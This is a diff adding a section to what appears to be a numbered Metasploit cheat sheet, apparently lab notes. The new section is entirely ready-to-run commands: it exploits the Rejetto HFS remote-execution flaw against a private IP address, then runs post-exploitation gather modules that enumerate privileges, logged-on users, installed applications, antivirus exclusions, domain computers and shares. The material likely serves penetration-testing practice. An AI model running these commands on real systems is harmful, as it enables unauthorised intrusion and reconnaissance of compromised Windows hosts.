@@ -1232,5 +1232,41 @@ set LHOST 192.136.51.2
 run
 sessions 2
 ```
+66) Windows Post Exploitation Modules
+```
+msfconsole
+use exploit/windows/http/rejetto_hfs_exec
+set RHOSTS 10.2.23.169
+run
+background
+use post/windows/gather/win_privs
+set SESSION 1
+run
+use post/windows/gather/enum_logged_on_users
+set SESSION 1
+run
+use post/windows/gather/checkvm
+set SESSION 1
+run
+use post/windows/gather/enum_applications
+set SESSION 1
+run
+use post/windows/gather/enum_av_excluded
+set SESSION 1
+run
+use post/windows/gather/enum_computers
+set SESSION 1
+run
+use post/windows/gather/enum_shares
+set SESSION 1
+run
+```
+
+
+
+
+
+
+
 
 
